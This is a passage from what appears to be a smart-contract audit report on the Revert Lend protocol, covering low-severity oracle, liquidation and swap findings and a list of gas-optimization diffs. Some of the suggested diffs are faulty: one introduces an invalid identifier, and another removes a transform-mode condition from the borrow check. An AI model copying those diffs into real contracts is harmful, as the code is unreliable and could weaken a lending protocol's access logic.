 > [02] - Non-Critical.<br>
 > [03] - Non-Critical.
> 
> 3 downgraded Lows: [#98](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/98), [#119](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/119) and [#129](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/129). 

## [[04] The logic behind `MIN_PRICE_DIFFERENCE` is heavily flawed as it allows for heavy arbitraging](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/98)

*Note: At the judge’s request [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/128#issuecomment-2050761513), this downgraded issue from the same warden has been included in this report for completeness.*

The `V3Oracle` contract defines `maxPoolPriceDifference` to regulate the maximum price difference allowed between the oracle price and the pool price. This parameter is crucial for maintaining the integrity and reliability of price information used in financial decisions.

Keep in mind that the `_maxPoolPriceDifference` cannot be set to be lower than the already stored `MIN_PRICE_DIFFERENCE`

https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Oracle.sol#L190-L196

```solidity
    function setMaxPoolPriceDifference(uint16 _maxPoolPriceDifference) external onlyOwner {
        if (_maxPoolPriceDifference < MIN_PRICE_DIFFERENCE) {
            revert InvalidConfig();
        }
        maxPoolPriceDifference = _maxPoolPriceDifference;
        emit SetMaxPoolPriceDifference(_maxPoolPriceDifference);
    }
```

Now initially we can see that `maxPoolPriceDifference` is set equal to `MIN_PRICE_DIFFERENCE` [which is 200, i.e. 2%](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Oracle.sol#L25-L28).

```solidity
uint16 public maxPoolPriceDifference = MIN_PRICE_DIFFERENCE; // max price difference between oracle derived price and pool price x10000
```

Now given that the maximum price difference is set at a value that translates to a 2% tolerance, this threshold may not be stringent enough for protocol and actually causes arbitrageurs to come and heavily game the system. This setting implies that the system could accept and act upon price data that is up to 2% away from the real market price.

For example, Ethereum is set to be reaching `$5000` in the coming days, this means that protocol is allowing arbitrageurs to go away with `$100` as a spread. Say the current mode is `CHAINLINK_TWAP_VERIFY`, the twap could return a value 1.9% higher than the real life value and protocol would still integrate with this couple that with the fact that protocol implements leveraging logic and that uniswap oracles which are unreliable on L2s are used. This would lead to a leak of value.

### Impact

The `V3Oracle` contract specifies a maximum allowable price difference between the oracle-derived price and the actual pool price, with a set tolerance of 2% (`maxPoolPriceDifference = MIN_PRICE_DIFFERENCE`). This threshold is intended to mitigate the risks associated with minor price discrepancies due to market volatility or latency in oracle updates. However, setting this tolerance to 2% is excessive. Such a wide margin for price difference would not only lead to the acceptance of faulty price data, but also a leak of value to the protocol by arbitragers as they can carefully chose their trading decisions to game the system.

### Recommended Mitigation Steps

Reconsider the value of `MIN_PRICE_DIFFERENCE` or atl east introduce a functionality to be able to change the value after deployment of protocol.

### Assessed type

Context

**[kalinbas (Revert) confirmed and commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/98#issuecomment-2030646163):**
> After discussion we think it might be better to remove `MIN_PRICE_DIFFERENCE` and leave it completely configurable. Changes in Oracle will be made with a Timelock contract anyway, and the risk is that protocol owner could configure a very small value and break borrowing and liquidations (which he could do as well just by setting an invalid TokenConfig).

**[mariorz (Revert) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/98#issuecomment-2038789296):**
> While we are indeed removing the `MIN_PRICE_DIFFERENCE` and wanted to state that in this issue that also pertains to the `MIN_PRICE_DIFFERENCE`, it is not in any way a confirmation of the validity of this issue.
>
> The issue claims that a 2% setting would lead to economic attacks, yet does not show how that would be executed. We agree with the QA classification.

**[kalinbas (Revert) commented](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/98#issuecomment-2045751093):**
> PR [here](https://github.com/revert-finance/lend/pull/9).

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/98).*

## [[05] No grace period applied which would then allow positions to be liquidated after sequencer goes down since now users don't have enough time to deposit funds](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/119)

*Note: At the judge’s request [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/128#issuecomment-2050761513), this downgraded issue from the same warden has been included in this report for completeness.*

Taking a look [here](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/V3Vault.sol#L685-L758), one can see that this function is used to liquidate a position with having a healthy check to ensure that positions being liquidated are actually the ones that are not afloat.

```solidity
        (state.isHealthy, state.fullValue, state.collateralValue, state.feeValue) =
            _checkLoanIsHealthy(params.tokenId, state.debt);
        if (state.isHealthy) {
            revert NotLiquidatable();
        }
```

Problem is that [protocol has clearly stated that they would deploy to any EVM compatible chain](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/README.md#L87-L88) which include different L2s, but no sequencer checks are present in protocol. This leads to a scenario where if the sequencer ever goes down and comes back up users wouldn't have enough time to get their positions back afloat since all price updates would be immediately consumed after the sequencer comes back up (note that while the sequencer is down users can't deposit in more capital), this now causes their positions to be immediately unfairly liquidatable.

### Impact

Users would be unfairly liquidated since they do not have enough ample time to return their positions back afloat after the sequencer goes off.

### Recommended Mitigation Steps

Introduce L2 sequencer checks and provide a grace period for users if the sequencer ever goes down to keep their positions afloat.

### Assessed type

Context

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/119).*

## [[06] `RouterSwapParams` lacks a deadlining logic and could lead to unfavourable swaps](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/129)

*Note: At the judge’s request [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/128#issuecomment-2050761513), this downgraded issue from the same warden has been included in this report for completeness.*

The `RouterSwapParams` struct and the `_routerSwap` function currently do not include any parameters or logic to enforce a deadline for swap completion. This means there is no built-in mechanism to prevent a swap from occurring if the market conditions change unfavourably after the swap was initiated but before it was executed.

See [here](https://github.com/code-423n4/2024-03-revert-lend/blob/457230945a49878eefdc1001796b10638c1e7584/src/utils/Swapper.sol#L59-L77):

```solidity
struct RouterSwapParams {
    IERC20 tokenIn;
    IERC20 tokenOut;
    uint256 amountIn;
    uint256 amountOutMin;
    bytes swapData;
}

function _routerSwap(RouterSwapParams memory params)
    internal
    returns (uint256 amountInDelta, uint256 amountOutDelta)
{
    // Swap logic without deadline enforcement
}
```

Swaps are executed without considering the time sensitivity of the operation, which is critical in a highly volatile market environment. The absence of a deadline parameter means that once initiated, a swap could theoretically be executed at any point in the future, regardless of how market conditions may have changed. Also note that whereas the slippage logic is already present to protect from returning less than the accepted minimum users could still get affected, take a look at this scenario:

A swap is placed, `amountOutMin` is `100XYZ` tokens, as at the price of `1XYZ = $1`, swap stays for long in the mempool (during this period the price of `1XYZ` drops to `$0.8`), so now swap gets finalized, user received `100XYZ` tokens, but in reality they've lost 20% of their "acceptable" minimum value in dollars.

### Impact

The lack of a deadline mechanism in the `RouterSwapParams` structure can lead to unfavourable outcomes for users, since having a `deadline` lets the caller specify a deadline parameter that enforces a time limit by which the transaction must be executed. Without a deadline parameter, the transaction may sit in the mempool and be executed at a much later time potentially resulting in a worse price for the user.

### Recommended Mitigation Steps

Introduce a deadline parameter to the `RouterSwapParams` struct and apply it to swaps.

## Assessed type

Context

*Note: For full discussion, see [here](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/129).*

***

## [Improper return of `chainlinkReferencePriceX96` in V3Oracle.`_getReferenceTokenPriceX96()`](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/220)

*Submitted by [kennedy1030](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/220), also found by [t4sk](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/22).*

*Note: Since the sponsor team chose to [mitigate](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#additional-scope-to-be-reviewed), this downgraded issue has been included in this report for completeness.*

In certain situations, `cachedChainlinkReferencePriceX96` cannot prevent the reevaluation of the price of `referenceToken` in [V3Oracle.getValue()](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Oracle.sol#L95-L131).

### Proof of Concept

In `V3Oracle._getReferenceTokenPriceX96()` at [L278](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Oracle.sol#L278), for the scenario where `token = referenceToken`, the returned value of `chainlinkReferencePriceX96` is `0`.

```javascript
    function _getReferenceTokenPriceX96(address token, uint256 cachedChainlinkReferencePriceX96)
        internal
        view
        returns (uint256 priceX96, uint256 chainlinkReferencePriceX96)
    {
        if (token == referenceToken) {
278         return (Q96, chainlinkReferencePriceX96);
        }

        TokenConfig memory feedConfig = feedConfigs[token];

        if (feedConfig.mode == Mode.NOT_SET) {
            revert NotConfigured();
        }

        uint256 verifyPriceX96;

        bool usesChainlink = (
            feedConfig.mode == Mode.CHAINLINK_TWAP_VERIFY || feedConfig.mode == Mode.TWAP_CHAINLINK_VERIFY
                || feedConfig.mode == Mode.CHAINLINK
        );
        bool usesTWAP = (
            feedConfig.mode == Mode.CHAINLINK_TWAP_VERIFY || feedConfig.mode == Mode.TWAP_CHAINLINK_VERIFY
                || feedConfig.mode == Mode.TWAP
        );

        if (usesChainlink) {
            uint256 chainlinkPriceX96 = _getChainlinkPriceX96(token);
300         chainlinkReferencePriceX96 = cachedChainlinkReferencePriceX96 == 0
                ? _getChainlinkPriceX96(referenceToken)
                : cachedChainlinkReferencePriceX96;

            chainlinkPriceX96 = (10 ** referenceTokenDecimals) * chainlinkPriceX96 * Q96 / chainlinkReferencePriceX96
                / (10 ** feedConfig.tokenDecimals);

            if (feedConfig.mode == Mode.TWAP_CHAINLINK_VERIFY) {
                verifyPriceX96 = chainlinkPriceX96;
            } else {
                priceX96 = chainlinkPriceX96;
            }
        }

        if (usesTWAP) {
            uint256 twapPriceX96 = _getTWAPPriceX96(feedConfig);
            if (feedConfig.mode == Mode.CHAINLINK_TWAP_VERIFY) {
                verifyPriceX96 = twapPriceX96;
            } else {
                priceX96 = twapPriceX96;
            }
        }

        if (feedConfig.mode == Mode.CHAINLINK_TWAP_VERIFY || feedConfig.mode == Mode.TWAP_CHAINLINK_VERIFY) {
            _requireMaxDifference(priceX96, verifyPriceX96, feedConfig.maxDifference);
        }
    }
```

It sets the value of `cachedChainlinkReferencePriceX96` to `0` in [V3Oracle.getValue()](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Oracle.sol#L95-L131).

```javascript
    function getValue(uint256 tokenId, address token)
        external
        view
        override
        returns (uint256 value, uint256 feeValue, uint256 price0X96, uint256 price1X96)
    {
        (address token0, address token1, uint24 fee,, uint256 amount0, uint256 amount1, uint256 fees0, uint256 fees1) =
            getPositionBreakdown(tokenId);

        uint256 cachedChainlinkReferencePriceX96;

106     (price0X96, cachedChainlinkReferencePriceX96) =
            _getReferenceTokenPriceX96(token0, cachedChainlinkReferencePriceX96);
108     (price1X96, cachedChainlinkReferencePriceX96) =
            _getReferenceTokenPriceX96(token1, cachedChainlinkReferencePriceX96);

        uint256 priceTokenX96;
        if (token0 == token) {
            priceTokenX96 = price0X96;
        } else if (token1 == token) {
            priceTokenX96 = price1X96;
        } else {
117         (priceTokenX96,) = _getReferenceTokenPriceX96(token, cachedChainlinkReferencePriceX96);
        }

        value = (price0X96 * (amount0 + fees0) / Q96 + price1X96 * (amount1 + fees1) / Q96) * Q96 / priceTokenX96;
        feeValue = (price0X96 * fees0 / Q96 + price1X96 * fees1 / Q96) * Q96 / priceTokenX96;
        price0X96 = price0X96 * Q96 / priceTokenX96;
        price1X96 = price1X96 * Q96 / priceTokenX96;

        // checks derived pool price for price manipulation attacks
        // this prevents manipulations of pool to get distorted proportions of collateral tokens - for borrowing
        // when a pool is in this state, liquidations will be disabled - but arbitrageurs (or liquidator himself)
        // will move price back to reasonable range and enable liquidation
        uint256 derivedPoolPriceX96 = price0X96 * Q96 / price1X96;
        _checkPoolPrice(token0, token1, fee, derivedPoolPriceX96);
    }
```

In fact, `cachedChainlinkReferencePriceX96` is established to prevent the reevaluation of the price of `referenceToken` in `V3Oracle._getReferenceTokenPriceX96()` at [L300](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Oracle.sol#L300).

However, when `token1 = referenceToken` in [V3Oracle.getValue()](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Oracle.sol#L108), the `cachedChainlinkReferencePriceX96` value is set to `0`, and it fails to prevent the recalculation in the subsequent call of `_getReferenceTokenPriceX96()` at [L117](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Oracle.sol#L117).

### Recommended Mitigation Steps

```diff
    function _getReferenceTokenPriceX96(address token, uint256 cachedChainlinkReferencePriceX96)
        internal
        view
        returns (uint256 priceX96, uint256 chainlinkReferencePriceX96)
    {
        if (token == referenceToken) {
-           return (Q96, chainlinkReferencePriceX96);
+           return (Q96, cachedChainlinkReferencePriceX96);
        }

        [...]
    }
```

**[kalinbas (Revert) confirmed, but disagreed with severity](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/220#issuecomment-2020820925)**

**[ronnyx2017 (judge) decreased severity to QA](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/220#issuecomment-2028747004)**

**[Revert mitigated](https://github.com/code-423n4/2024-04-revert-mitigation?tab=readme-ov-file#scope):**
> Fixed [here](https://github.com/revert-finance/lend/pull/13).

**Status:** Mitigation Confirmed. Full details in reports from [b0g0](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/59), [thank_you](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/70) and [ktg](https://github.com/code-423n4/2024-04-revert-mitigation-findings/issues/6).

***

# Gas Optimizations

For this audit, 7 reports were submitted by wardens detailing gas optimizations. The [report highlighted below](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/514) by **0x11singh99** received the top score from the judge.

*The following wardens also submitted reports: [SM3\_SS](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/519), [dharma09](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/508), [InAllHonesty](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/161), [SAQ](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/509), [0xAnah](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/456), and [0xhacksmithh](https://github.com/code-423n4/2024-03-revert-lend-findings/issues/439).*

## [G-01] State variables can be packed into fewer storage slots by reducing their sizes (*Instances missed by bot*)

The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to each other in storage and this will pack the values together into a single 32 byte storage slot (if values combined are `<=` 32 bytes). If the variables packed together are retrieved together in functions (more likely with structs), we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a Gwarmaccess (100 gas) versus a Gcoldsload (2100 gas).

SAVE: ~8000 GAS, 4 SLOT.

### `multiplierPerSecondX96`, `baseRatePerSecondX96` and `jumpMultiplierPerSecondX96` can be packed in single slot by reducing their sizes to `uint80` each SAVES: ~4000 Gas, 2 SLOT

All these three variables are set inside only `setValues` function where a check is implemented for passed function params and then after dividing by `YEAR_SECS` constant values are assigned into these state variables. It will make sure that `multiplierPerSecondX96`, `baseRatePerSecondX96` and `jumpMultiplierPerSecondX96` maximum values can be `MAX_MULTIPLIER_X96 / YEAR_SECS`, `MAX_BASE_RATE_X96 / YEAR_SECS` and `MAX_MULTIPLIER_X96 / YEAR_SECS` respectively not more than that.

Since these constants are defined in same contract. So their approximate values are:

- `MAX_MULTIPLIER_X96 / YEAR_SECS` `< 10**22`
- `MAX_BASE_RATE_X96 / YEAR_SECS` `< 7.5*10**20`

While `uint80` can hold `> ~10**24 ` 
So we can easily say that `uint80` is sufficient to hold these max values So we can safely reduce the above mentioned storage var. sizes to each `uint80` to pack all three into 1 slot and saves 2 storage slots.

```solidity
File : InterestRateModel.sol

23:    uint256 public multiplierPerSecondX96;
24:    uint256 public baseRatePerSecondX96;
25:    uint256 public jumpMultiplierPerSecondX96;
```

[InterestRateModel.sol#L23-L25](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/InterestRateModel.sol#L23-L25)

Relevant code to prove why these state variable can be truncated:

```solidity
File : InterestRateModel.sol

13:  uint256 public constant YEAR_SECS = 31557600; // taking into account leap years
14:
15:  uint256 public constant MAX_BASE_RATE_X96 = Q96 / 10; // 10%
16:  uint256 public constant MAX_MULTIPLIER_X96 = Q96 * 2; // 200%
...
...

82:  function setValues(
         uint256 baseRatePerYearX96,
         uint256 multiplierPerYearX96,
         uint256 jumpMultiplierPerYearX96,
         uint256 _kinkX96
87:     ) public onlyOwner {
88:    if (
89:        baseRatePerYearX96 > MAX_BASE_RATE_X96 || multiplierPerYearX96 > MAX_MULTIPLIER_X96
90:             || jumpMultiplierPerYearX96 > MAX_MULTIPLIER_X96
91:        ) {
92:            revert InvalidConfig();
93:        }
94:
95:  baseRatePerSecondX96 = baseRatePerYearX96 / YEAR_SECS;
96:  multiplierPerSecondX96 = multiplierPerYearX96 / YEAR_SECS;
97:  jumpMultiplierPerSecondX96 = jumpMultiplierPerYearX96 / YEAR_SECS;
```

[InterestRateModel.sol#L13-L16](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/InterestRateModel.sol#L13-L16), [InterestRateModel.sol#L88-L97](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/InterestRateModel.sol#L88-L97)

### Recommended Mitigation Steps

```diff
File : InterestRateModel.sol

-23:    uint256 public multiplierPerSecondX96;
-24:    uint256 public baseRatePerSecondX96;
-25:    uint256 public jumpMultiplierPerSecondX96;
+23:    uint80 public multiplierPerSecondX96;
+24:    uint80 public baseRatePerSecondX96;
+25:    uint80 public jumpMultiplierPerSecondX96;
```

### `dailyLendIncreaseLimitLastReset` and `dailyDebtIncreaseLimitLastReset` can be packed with `reserveProtectionFactorX32` SAVES: ~4000 Gas, 2 Slot

Since values in these variables are only assigned in `_resetDailyLendIncreaseLimit` and `_resetDailyDebtIncreaseLimit` functions respectively with the value of `block.timestamp/1 Days` for both. So it is sufficient to hold these values in `uint32`. Reduce those variable sizes to uint32 each and pack with `reserveProtectionFactorX32`. Saves 2 storage slots.

```solidity
File : V3Vault.sol


121: uint32 public reserveProtectionFactorX32 = MIN_RESERVE_PROTECTION_FACTOR_X32;
...
...
140: uint256 public dailyLendIncreaseLimitLastReset = 0;
...
145: uint256 public dailyDebtIncreaseLimitLastReset = 0;
```

[V3Vault.sol#L121](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L121), [V3Vault.sol#L140-L145](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L140-L145)

### Recommended Mitigation Steps

```diff
File : V3Vault.sol


121: uint32 public reserveProtectionFactorX32 = MIN_RESERVE_PROTECTION_FACTOR_X32;
+140: uint32 public dailyLendIncreaseLimitLastReset = 0;
+145: uint32 public dailyDebtIncreaseLimitLastReset = 0;
...
...
-140: uint256 public dailyLendIncreaseLimitLastReset = 0;
...
-145: uint256 public dailyDebtIncreaseLimitLastReset = 0;
```

## [G-02] State variable can be packed into fewer storage slots by truncating timestamp

The EVM works with 32 byte words. Variables less than 32 bytes can be declared next to each other in storage and this will pack the values together into a single 32 byte storage slot (if values combined are `<=` 32 bytes). If the variables packed together are retrieved together in functions (more likely with structs), we will effectively save ~2000 gas with every subsequent SLOAD for that storage slot. This is due to us incurring a Gwarmaccess (100 gas) versus a Gcoldsload (2100 gas).

### Truncate uint256 `lastExchangeRateUpdate` to `uint64` and can be packed with address `emergencyAdmin`

`lastExchangeRateUpdate` can safely be truncated to `uint64` since it holds timestamp. `uint64` is much more sufficient to hold realistic time. It can also save 1 storage slot.

A `uint64` data type can represent values from `0` to `18,446,744,073,709,551,615`. To convert this range into years, we need to define the unit of time being represented.

If we consider seconds then: 1 year = 31,536,000 seconds.

So the maximum value a uint64 can represent in years is:

`18,446,744,073,709,551,615 seconds / 31,536,000 seconds per year ≈ 584,942,417 years`.

This is an astronomically large value and far exceeds any practical use case in most software applications including smart contracts. Therefore, for most practical purposes a uint64 range is sufficient for representing time durations in years.

```solidity
File : V3Vault.sol

127:  uint256 public lastExchangeRateUpdate = 0;
...
167:  address public emergencyAdmin;
```

[V3Vault.sol#L127](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L127), [V3Vault.sol#L167](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L167)

### Recommended Mitigation Steps

```diff
File : V3Vault.sol

-127:  uint256 public lastExchangeRateUpdate = 0;
...
167:  address public emergencyAdmin;
+127:  uint64 public lastExchangeRateUpdate = 0;
```

## [G-03] Pack the struct variables into fewer storage slots by re-ordering the variables

Saves: ~2000 Gas

To pack the struct efficiently you can rearrange the storage variables to minimize padding between variables. This optimization can help save gas costs by reducing the number of storage slots used.

Below recommended optimization can be made to this struct to save 1 storage slot per key in the mapping where this `TokenConfig` struct used.

*Note: I have tested this by adding test variable of `TokenConfig` type and run forge command `forge inspect src/V3Oracle.sol:V3Oracle storage --pretty` for both struct `Optimized` and `Un-optimized`. Unoptimized will take 3 storage slots while optimized one will take only 2 storage slots.

```solidity
File : V3Oracle.sol

43:  struct TokenConfig {
44:     AggregatorV3Interface feed; // chainlink feed
45:     uint32 maxFeedAge;
46:     uint8 feedDecimals;
47:     uint8 tokenDecimals;
48:     IUniswapV3Pool pool; // reference pool
49:     bool isToken0;
50:     uint32 twapSeconds;
51:     Mode mode;
52:     uint16 maxDifference; // max price difference x10000
53: }
```

[V3Oracle.sol#L43-L53](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Oracle.sol#L43-L53)

### Recommended Mitigation Steps

```diff
File : V3Oracle.sol

43:  struct TokenConfig {
44:     AggregatorV3Interface feed; // chainlink feed
45:     uint32 maxFeedAge;
46:     uint8 feedDecimals;
47:     uint8 tokenDecimals;
+50:     uint32 twapSeconds;
48:     IUniswapV3Pool pool; // reference pool
49:     bool isToken0;
-50:     uint32 twapSeconds;
51:     Mode mode;
52:     uint16 maxDifference; // max price difference x10000
53: }
```

## [G-04] Refactor `borrow` function to avoid 1 sload

Since `transformedTokenId == tokenId`, check that both should be equal. We can use `tokenId` instead of `transformedTokenId` and check `tokenId` for `0` and also, we don't have check the second condition we can remove `transformedTokenId == tokenId` in this check.

```solidity
File : V3Vault.sol

550: function borrow(uint256 tokenId, uint256 assets) external override {
551:      bool isTransformMode =
552:       transformedTokenId > 0 && transformedTokenId == tokenId && transformerAllowList[msg.sender];
```

[V3Vault.sol#L550-L552](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L550-L552)

### Recommended Mitigation Steps

```diff
File : V3Vault.sol

550: function borrow(uint256 tokenId, uint256 assets) external override {
551:      bool isTransformMode =
-552:       transformedTokenId > 0 && transformedTokenId == tokenId && transformerAllowList[msg.sender];
+552:       tokenId > 0 && transformerAllowList[msg.sender];
```

## [G-05] Refactor `configToken` function to fail early and `saves 1 external call` on failing

To refactor the `configToken` function to fail early and save one external call on failing condition. You can move the check for `config.isActive` and the subsequent check for `config.token0TriggerTick >= config.token1TriggerTick` up before the external call to `nonfungiblePositionManager.ownerOf(tokenId)`. This way if any of the conditions fail the function will revert before making the `external call`.

```solidity
File : automators/AutoExit.sol

218:    function configToken(uint256 tokenId, PositionConfig calldata config) external {
219:        address owner = nonfungiblePositionManager.ownerOf(tokenId);
220:        if (owner != msg.sender) {
221:            revert Unauthorized();
222:        }
223:
224:        if (config.isActive) {
225:            if (config.token0TriggerTick >= config.token1TriggerTick) {
226:                revert InvalidConfig();
227:            }
228:        }
```

[AutoExit.sol#L218-L228](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/automators/AutoExit.sol#L218-L228)

### Recommended Mitigation Steps

```diff
File : automators/AutoExit.sol

218:    function configToken(uint256 tokenId, PositionConfig calldata config) external {
+224:        if (config.isActive) {
+225:            if (config.token0TriggerTick >= config.token1TriggerTick) {
+226:                revert InvalidConfig();
+227:            }
+228:        }

219:        address owner = nonfungiblePositionManager.ownerOf(tokenId);
220:        if (owner != msg.sender) {
221:            revert Unauthorized();
222:        }
223:
-224:        if (config.isActive) {
-225:            if (config.token0TriggerTick >= config.token1TriggerTick) {
-226:                revert InvalidConfig();
-227:            }
-228:        }
```

## [G-06] Cache state variable outside of the else block to save 1 sload

Cache `transformedTokenId` outside of the else block saves 1 sload (~100 gas) on above if statement false.

```solidity
File : V3Vault.sol

441: if (transformedTokenId == 0) {
...
450:     } else {
451:          uint256 oldTokenId = transformedTokenId;
```

[V3Vault.sol#L441-L451](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L441-L451)

### Recommended Mitigation Steps

```diff
File : V3Vault.sol

+451:          uint256 oldTokenId = transformedTokenId;
441: if (transformedTokenId == 0) {
...
450:     } else {
-451:          uint256 oldTokenId = transformedTokenId;
```

## [G-07] Use direct global `msg.sender` instead of taking it as function parameter

Use directly `msg.sender` instead of taking it as `owner` function parameter.

```solidity
File : V3Vault.sol

410:    function createWithPermit(
411:        uint256 tokenId,
412:        address owner,
413:        address recipient,
414:        uint256 deadline,
415:        uint8 v,
416:        bytes32 r,
417:        bytes32 s
418:    ) external override {
419:        if (msg.sender != owner) {
420:            revert Unauthorized();
421:        }
422:
423:        nonfungiblePositionManager.permit(address(this), tokenId, deadline, v, r, s);
424:        nonfungiblePositionManager.safeTransferFrom(owner, address(this), tokenId, abi.encode(recipient));
425:    }
```

[V3Vault.sol#L410-L425](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L410-L425)

### Recommended Mitigation Steps

```diff
File : V3Vault.sol

410:    function createWithPermit(
411:        uint256 tokenId,
-412:        address owner,
413:        address recipient,
414:        uint256 deadline,
415:        uint8 v,
416:        bytes32 r,
417:        bytes32 s
418:    ) external override {
-419:        if (msg.sender != owner) {
-420:            revert Unauthorized();
-421:        }
422:
423:        nonfungiblePositionManager.permit(address(this), tokenId, deadline, v, r, s);
-424:        nonfungiblePositionManager.safeTransferFrom(owner, address(this), tokenId, abi.encode(recipient));
+424:        nonfungiblePositionManager.safeTransferFrom(msg.sender, address(this), tokenId, abi.encode(recipient));
425:    }
```

## [G-08] Cache calculations instead of re-calculating. Saves 3 checked subtractions.

### Instance 1

Cache `block.timestamp - lastRateUpdate` to save 1 checked subtraction.

```solidity
File : V3Vault.sol

1188:    + oldDebtExchangeRateX96 * (block.timestamp - lastRateUpdate) * borrowRateX96 / Q96;
1189:         newLendExchangeRateX96 = oldLendExchangeRateX96
1190:            + oldLendExchangeRateX96 * (block.timestamp - lastRateUpdate) * supplyRateX96 / Q96;
```

[V3Vault.sol#L1188-L1190](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L1188-L1190)

### Recommended Mitigation Steps

```diff
File : V3Vault.sol

+         uint256 block.timestampSUBlastRateUpdate = block.timestamp - lastRateUpdate;

-1188:    + oldDebtExchangeRateX96 * (block.timestamp - lastRateUpdate) * borrowRateX96 / Q96;
+1188:    + oldDebtExchangeRateX96 * (block.timestampSUBlastRateUpdate) * borrowRateX96 / Q96;
1189:         newLendExchangeRateX96 = oldLendExchangeRateX96
-1190:            + oldLendExchangeRateX96 * (block.timestamp - lastRateUpdate) * supplyRateX96 / Q96;
+1190:            + oldLendExchangeRateX96 * (block.timestampSUBlastRateUpdate) * supplyRateX96 / Q96;
```

### Instance 2

Cache `SafeCast.toUint192(oldShares - newShares)` and `SafeCast.toUint192(newShares - oldShares)` can save 2 checked subtractions.

```solidity
File : V3Vault.sol


1216:  if (oldShares > newShares) {
1217:      tokenConfigs[token0].totalDebtShares -= SafeCast.toUint192(oldShares - newShares);
1218:      tokenConfigs[token1].totalDebtShares -= SafeCast.toUint192(oldShares - newShares);
1219:  } else {
1220:      tokenConfigs[token0].totalDebtShares += SafeCast.toUint192(newShares - oldShares);
1221:      tokenConfigs[token1].totalDebtShares += SafeCast.toUint192(newShares - oldShares);
```

[V3Vault.sol#L1216-L1221](https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L1216-L1221)

### Recommended Mitigation Steps

```diff
File : V3Vault.sol

1216:  if (oldShares > newShares) {
+         uint192 safecast_to192_oldShares = SafeCast.toUint192(oldShares - newShares);
-1217:      tokenConfigs[token0].totalDebtShares -= SafeCast.toUint192(oldShares - newShares);
-1218:      tokenConfigs[token1].totalDebtShares -= SafeCast.toUint192(oldShares - newShares);
+1217:      tokenConfigs[token0].totalDebtShares -= safecast_to192_oldShares;
+1218:      tokenConfigs[token1].totalDebtShares -= safecast_to192_oldShares;
1219:  } else {
+         uint192 safecast_to192_newshares = SafeCast.toUint192(newShares - oldShares);
-1220:      tokenConfigs[token0].totalDebtShares += SafeCast.toUint192(newShares - oldShares);
-1221:      tokenConfigs[token1].totalDebtShares += SafeCast.toUint192(newShares - oldShares);
+1220:      tokenConfigs[token0].totalDebtShares += safecast_to192_newshares;
+1221:      tokenConfigs[token1].totalDebtShares += safecast_to192_newshares;
```

## [G-09] Struct can be packed into fewer storage slot by truncating time

### `deadline`, `rewardX64` and `liquidity` can be packed in a single slot. 

SAVES: 4000 Gas, 2 Slots

You can pack the `ExecuteParams` struct into fewer storage slots by truncating the `deadline` to a smaller data type such as uint64. `deadline` can be represented within this range.

A `uint64` data type can represent values from `0` to `18,446,744,073,709,551,615`. To convert this range into years we need to define the unit of time being represented.

If we consider seconds then: 1 year = 31,536,000 seconds.

So the maximum value a uint64 can represent in years is:

`18,446,744,073,709,551,615 seconds / 31,536,000 seconds per year ≈ 584,942,417 years`.

This is an astronomically large value and far exceeds any practical use case in most software applications including smart contracts. Therefore, for most practical purposes a uint64 range is sufficient for representing time durations in years.

```solidity
File : automators/AutoExit.sol

63:    struct ExecuteParams {
64:        uint256 tokenId; // tokenid to process
